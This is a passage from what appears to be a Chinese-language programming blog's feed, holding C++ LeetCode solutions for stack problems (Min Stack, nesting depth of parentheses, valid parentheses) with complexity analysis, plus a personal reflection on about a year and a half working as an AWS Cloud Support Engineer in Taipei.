class="type">bool</span> <span class="title">MinStack::isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Top == <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡我額外寫一個函數判斷Stack是否為空</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/155/results.jpeg"></p><blockquote><p>其實就是又長又冗，而且這樣 <code>getMin</code>複雜度會是 $O(N)$，因此這段程式並不能滿足要求<br>而且看了別人的作法才發現自己在耍白癡，這題明明也沒說不能用 <code>&lt;stack&gt;</code> ，還以為要重頭到尾重新刻出一個 Stack 出來 XD<br>即使沒用 <code>&lt;stack&gt;</code> 也還是有更加 optimized 的做法</p></blockquote><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> min_val = <span class="built_in">getMin</span>();</span><br><span class="line">        <span class="keyword">if</span> (st.<span class="built_in">empty</span>() || min_val &gt; val) &#123;</span><br><span class="line">            min_val = val;</span><br><span class="line">        &#125;</span><br><span class="line">        st.<span class="built_in">push_back</span>(&#123;val, min_val&#125;);        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        st.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">empty</span>() ? <span class="number">-1</span> : st.<span class="built_in">back</span>()[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">empty</span>() ? <span class="number">-1</span> : st.<span class="built_in">back</span>()[<span class="number">1</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或者透過 <code>&lt;stack&gt;</code> 實作</p><blockquote><p><a href="https://www.youtube.com/watch?v=GhvT9Ob8aps">https://www.youtube.com/watch?v=GhvT9Ob8aps</a></p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/155/results2.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>我原本的做法:</p><ul><li>push: $O(1)$</li><li>pop: $O(1)$</li><li>top: $O(1)$</li><li>getMin: $O(n)$</li><li>isEmpty: $O(1)$</li></ul><p>改良做法:</p><ul><li>push: $O(1)$</li><li>pop: $O(1)$</li><li>top: $O(1)$</li><li>getMin: $O(1)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>O(N), N 為節點數量。</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><blockquote><p>下次要更加仔細理解題意…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses</title>
      <link href="/posts/31bdd3b4.html"/>
      <url>/posts/31bdd3b4.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/1614/question.jpeg"></p><p><strong>Constraints:</strong></p><ul><li><p>1 &lt;&#x3D; s.length &lt;&#x3D; 100</p></li><li><p>s consists of digits 0-9 and characters ‘+’, ‘-‘, ‘*’, ‘&#x2F;‘, ‘(‘, and ‘)’.</p></li><li><p>It is guaranteed that parentheses expression s is a VPS.</p></li><li><p>題目難度: <code>Easy</code></p></li><li><p>題目敘述: 給定一個有效的括號字串 <code>s</code>，回傳括號nesting的深度</p></li></ul><blockquote><p>這裡有效的意思就代表不會有類似這種字串出現 <code>)()()(())(</code>，一定會是閉合成對的括號</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>這題很簡單，從想解法(畫在平板上)到最後Submission Accept花了11分鐘。</p></blockquote><p>首先要想的問題會是: <strong>如何判斷nesting parentheses?</strong> 我認為只要有連續的左邊未閉合括號出現，就能夠判斷出nesting深度。因此要做的事情就是當出現左括號 <code>(</code> 就 push 進 stack，當出現右括號就 pop出stack，這些操作進行的同時記錄下stack的數量變化，最大值即為深度。</p><p><img src="/img/LeetCode/1614/algo.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">        <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxDepth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(c);</span><br><span class="line">                counter++;</span><br><span class="line">                <span class="keyword">if</span>(counter &gt;= maxDepth) maxDepth = counter; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>)&#123; <span class="comment">// valid nested parentheses, so don&#x27;t need to check if stack empty before pop()</span></span><br><span class="line">                sk.<span class="built_in">pop</span>();</span><br><span class="line">                counter--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxDepth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>主要都跟上面想法一樣，透過一個整數變數<code>maxDepth</code> 來紀錄 <code>counter</code> 的變化</li><li>當 <code>counter</code> 值比當前 <code>maxDepth</code> 還要大時，更新 maxDepth</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/1614/results1.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxDepth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c: s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">            sk.<span class="built_in">push</span>(c);</span><br><span class="line">            counter++;</span><br><span class="line">            <span class="keyword">if</span>(counter &gt;= maxDepth) maxDepth = counter; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>)&#123; <span class="comment">// valid nested parentheses, so don&#x27;t need to check if stack empty before pop()</span></span><br><span class="line">            sk.<span class="built_in">pop</span>();</span><br><span class="line">            counter--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxDepth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;8*((1*(5+6))*(8/6))&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Max Depth: &quot;</span> &lt;&lt; <span class="built_in">maxDepth</span>(s) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>本題時間複雜度主要取決於對輸入字符串 <code>s</code> 的遍歷。使用了 for 迴圈來遍歷字串中的每一個字元，並對每個字元進行了常數時間的操作（push、pop、counter加減等）。因此操作會是 $O(n)$，其中 $n$ 是字符串的長度。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度主要取決於使用的Stack。最壞情況下，Stack中可能會包含所有的左括號 <code>(</code>，這樣的情況會發生在所有的開括號 <code>(</code> 都在字串的前半部分，而所有的右括號 <code>)</code> 都在字串的後半部分。此時，Stack的大小最多為 $n&#x2F;2$，因此空間複雜度為 $O(n)$。</p><p>此外，使用了額外的變數 <code>counter</code> 和 <code>maxDepth</code>，它們的空間複雜度是 O(1)。</p><p>綜合來看空間複雜度為 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近一年半的 AWS Cloud Support Engineer 心得記錄</title>
      <link href="/posts/c0ef3a5f.html"/>
      <url>/posts/c0ef3a5f.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote><p>目前在台灣亞馬遜網路服務公司 (Amazon Web Services) 擔任 <strong>雲端支援工程師 (Cloud Support Engineer)</strong> ，但兩天後就要離職了，因此想說趁離職前紀錄並回顧一下這一年半以來的工作以及生活。</p></blockquote><p>我是在我碩二上的時候(2021年10月)投遞AWS Cloud Support 校園招聘的職缺，當時原本在找研發替代役，後來因為知道AWS有開缺，抱持著試試看的心情投遞了履歷。大概隔天就收到了Online Assessment 的通知。OA其實就是簡單的電腦基礎知識，應該只是拿來篩本科非本科的(?)，接著就是Phone Interview，當時的校招可以排志願序，我原本想去的是 Security 或者 Deployment Profile，但我在面試過程中，發現問題大多會跟 Troubleshooting 相關，因此Security Fail了，然後Deployment 進到最後的loop 的最後一關技術關也被問爆，後來轉面 <strong>DMS(Developer and Mobile Services)</strong> ，雖然是自己完全不太熟悉的領域，但好險最後通過面試了。</p><p>後續在完成碩士班學業跟當完兵後，終於在 2023年的3月底入職，這是我人生中的第一份正職工作。</p><h1 id="Onboarding"><a href="#Onboarding" class="headerlink" title="Onboarding"></a>Onboarding</h1><p>進來的前幾個月會有員工訓練，以及學習各自團隊需要會的服務，這個階段很需要快速吸收各種知識，每天都有新東西要學，非常充實，會需要快速學會一項技術或工具。這幾個月可能是最幸福的時候，學東西又有薪水拿，但其實基礎也是靠這段時間打下，所以我前面幾個月花了一些時間在內部實現環境來部署和串接服務。Ex. 實作 API Gateway Private Integration、實驗一下 Lambda 的 Provision Concurrency之類的。 </p><p>當時的生活挺愜意的，帶著Mac Pro去公司，隨便找個座位坐下 (Agile Desk, Shared Desk)，進入 AWS Console，進到 <code>us-east-1</code> 開始練習跟操作資源。雲端公司的好處就是本地員工的硬體不用太好，反正連到某個Region 去做事就好。累了就去喝個茶泡個咖啡，看著窗外的101或陶朱隱園欣賞一下。</p><h1 id="日常工作"><a href="#日常工作" class="headerlink" title="日常工作"></a>日常工作</h1><p><img src="/img/AWS/CSE/aws2.jpg"></p><p>Onboarding 期間也學習如何解決Case，這份工作蠻像是救災人員，通常會開Case進來的人可能已經面臨生產環境受損的狀態，這時候可能會需要跟客戶開會，釐清問題，然後試著解決，如果這是我們不能解決的問題，可以將問題轉交給內部更厲害的團隊來進行調查(他們有權限使用某些調查工具)，有時候也會需要跟內部服務團隊溝通了解細節。不同的Case 也會有不同的緊急程度，因此會需要隨時警惕，可能原本還很悠哉，突然就有緊急的case進來 (當然也是會有非緊急但開成緊急的客戶)，可能一句話就是要開會，然後開始看客戶的操作畫面進行調查。</p><p>這裡我覺得也很慶幸可以跟一群大神共事，我的有些問題對他們來說可能是蠢問題，但他們都很熱心回答，可以放心的學習各種知識，也有失敗的容錯空間，算是可以讓人安心待著的團隊。</p><p>Cloud Support 是輪班制的，因此周末也需要有人值班，畢竟 AWS Support 主打 <strong>365 * 24 服務不間斷</strong>，因此我們台北時區快下班時，接著就是愛爾蘭的都柏林的Support會繼續handle後續進來的case，接著就會輪到西雅圖來負責，隔天又會輪到台北。因此跨國間的交流在這裡也算是很頻繁。</p><blockquote><p>可能莫名就會有印度人來敲你問問題 XD</p></blockquote><p>對於比較大型的客戶，可能通常會需要跟負責該客戶的技術經理(TAM)或是架構師(SA) 開會討論，進行合作，這當中一定會有摩擦，就需要看個人怎麼消化了 (不好說XD)</p><h1 id="日常生活"><a href="#日常生活" class="headerlink" title="日常生活"></a>日常生活</h1><p>可能上午大家解Case完後就中午去永吉路吃便宜的，邊吃飯邊聊哪個人又遇到哪個客戶，週四下午再去享用公司訂的下午茶。接著一樣工作到自己的班結束。然後我覺得假算蠻多的，而且有補休，所以其實也蠻常請假去玩的，請假期間也不用擔心，如果客戶又回來，一定會有人幫忙接續下去的。</p><p><img src="/img/AWS/CSE/aws4.jpg"><br><img src="/img/AWS/CSE/aws5.jpg"><br>補個前幾周下午茶照片</p><p>公司也有蠻多活動的，只是有沒有時間參加又是另一回事了。雖然這份工作不用加班，但這 8小時 當中體感個人感覺挺緊湊的，之前還有過一個下午連續跟3個客戶開會，真的會爆炸。</p><h1 id="CSA-to-CSE"><a href="#CSA-to-CSE" class="headerlink" title="CSA to CSE"></a>CSA to CSE</h1><p>我在校園招聘時，主要是投CSA (Cloud Support Associate)，因為當時沒有雲端經驗，因此會先是這個position，但其實training結束後過一陣子就會進行轉CSE的流程，這段期間還是需要多解 Case並且多熟悉服務的特性，這個position的轉變影響到的其實就title跟薪資，但實際做的事情還是一樣:幫客戶 Troubleshooting。</p><h1 id="SME"><a href="#SME" class="headerlink" title="SME"></a>SME</h1><p>外部的人可能只會知道 AWS Certificate，但對AWS的人來說 SME (Subject-Matter-Expert) 會是比較重要的東西，這通常代表你在某個服務上非常熟悉已經可以成為那個服務的專家了，算是一個對於自己能力的證明，也算是一個有效的 data point 來證明你具備某些能力，在合作或升遷可能會多少有點幫助。</p><blockquote><p>參考: <a href="https://aws.amazon.com/tw/certification/certification-sme-program/">https://aws.amazon.com/tw/certification/certification-sme-program/</a></p></blockquote><h1 id="為何離職？"><a href="#為何離職？" class="headerlink" title="為何離職？"></a>為何離職？</h1><p>一言難盡，只能說我的個性不太適合當 Support，跟我剛進來的預期有一些落差，整體而言由於是要服務客戶，感覺比較偏向服務業，就是致力於提供良好客戶，滿足客戶的多數要求，但我預期會是解決有趣的技術問題，然而甚麼問題都可能有，每一天都沒辦法預料到會碰到甚麼，可能大多數的問題會是你重複遇過很多次的，或是就是沒什麼技術含量的問題，如果想要工作生活穩定，那這份工作還不錯，但這是我第一份工作，我希望學習更多東西，並不是侷限在特定的AWS服務上。</p><p>另外就是轉換跑道困難，當 Support時間越久，以前開發或者研究碰到的技術會逐漸淡忘，下班後其實也沒新力學新東西了，只想釋放8小時內接收到的負能量 (所以才說可能跟個性比較相關，我不太適合服務業)，因此曾經會的東西會逐漸淡忘，這讓我莫名的恐慌，我已經能夠預想到我30歲後跳槽失敗的樣子了。</p><p>Relocation 在這裡會是比較困難的路，我可能待不到這件是發生的時候，Promotion 就見仁見智，不方便評論了… :(</p><h1 id="有趣的-Part-公司過夜睡覺"><a href="#有趣的-Part-公司過夜睡覺" class="headerlink" title="有趣的 Part: 公司過夜睡覺"></a>有趣的 Part: 公司過夜睡覺</h1><p>在公司還是有很多有趣的時光，前陣子就挑戰在公司過夜，晚上先跟同事在公司訂Pizza 聊天，聊了好久，這種歡樂的氛圍真讚，等大家都走後我就回我的位置上了。</p><p><img src="/img/AWS/CSE/aws6.jpg"></p><p>第一次在公司過夜，雖然AWS另一棟有淋浴間，但想說早上6點搭捷運回家再洗就好。過了8點後公司就沒什麼人了，我就在我的座位上刷題，刷完後半夜在看艾爾登法環DLC的發行首日遊戲直播，大概每隔一小時 Security 就會來巡一次，以前就有聽過傳聞: 之前也有一個員工睡在公司過，但他就是在公司讀書，考到所有AWS證照後就閃人了，感覺跟我一樣也是個怪人。</p><p><img src="/img/AWS/CSE/aws7.jpg"><br>晚上信義區的夜景也是挺美的。</p><p><img src="/img/AWS/CSE/aws8.jpg"></p><p>算是在這間公司盡可能地留下深刻的回憶。</p><h1 id="後續發展"><a href="#後續發展" class="headerlink" title="後續發展"></a>後續發展</h1><p>自從打算離職後，也沒有繼續看心理醫生了，只能說離職治百病。淡忘的知識逐漸回歸身體，心情也逐漸開朗，也開始回歸以往的規律運動習慣，還在閒暇之餘投了一篇 IEEE CNS　的論文，現在正在刷題，非常的滋潤。</p><p>但總體而言，我還是會非常推薦使用 AWS服務，裡面的工程師都具備 <strong>Customer Obsession</strong> 以及 <strong>Deep Dive</strong> 的精神，作為客戶會是非常幸福的一件事。而這份工作帶來的友誼、人脈、資源都是非常寶貴的，也學習到很多以前並不具備的雲端服務知識，很多 Serverless 以及架構上的部屬方式。也算是非常寶貴的一年。</p><p>在後天離開前，還是有點小emo要跟這裡說再見了。希望我的同事們都能夠找到自己的歸屬~。再見台灣 Amazon。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Amazon </tag>
            
            <tag> Cloud Support </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效的括號 | Easy |LeetCode#20. Valid Parentheses</title>
      <link href="/posts/92b56b8e.html"/>
      <url>/posts/92b56b8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/20/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個字串 <code>s</code>，其中僅會包含 <code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>、<code>&#123;</code>、<code>&#125;</code> 這些括號，需要在函式內判斷字串內的括號組合是否是合法得的，那怎樣算合法?<ol><li>左括號一定要由相同類型的右括號閉合</li><li>括號閉合順序要正確</li><li>每個右括號也需要有相同類型的左括號閉合</li></ol></li></ul><p>舉例來說:</p><p>Valid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s= &quot;()[]&#123;&#125;&quot;</span><br><span class="line">s= &quot;([])&quot;</span><br><span class="line">s= &quot;[]&quot;</span><br></pre></td></tr></table></figure><p>Invalid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;([)]&quot;</span><br><span class="line">s = &quot;(]&quot;</span><br></pre></td></tr></table></figure><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>　我的想法就是在迭代字串中字元的時候，將所有左括號 push 進一個stack，如果下一個字元是相應的右括號，就將括號從 stack 中pop出來，只要最後檢查stack是否還有左括號在，就能判斷是否valid。當然還是有一些edge case需要處理</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">        <span class="comment">//check empty string</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;;</span><br><span class="line">        <span class="comment">// iterate over the string</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化一個 char type 的stack</li><li>首先判斷是否是空字串，如果字串是空的，直接回傳false</li><li>接著透過一個 for 迴圈來迭代字元，如果遇到任意左括號像是 <code>[</code>、<code>(</code>、 <code>&#123;</code> 則將其 push到 stack中</li><li>接著個別處理各種右括號的狀況，如果遇見 <code>)</code>，則先判斷是否 stack為空，如果為空直接回傳 false</li><li>如果 stack 中的頂端元素為相對應的 <code>(</code>，則將stack元素，pop出來，如果不是 <code>(</code> 則回傳false</li><li>其餘兩類的括號也是同樣處理</li><li>迴圈結束後，檢查stack是否為空，如果是空的那就代表字串是valid，反之則invalid</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/20/results1.png"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 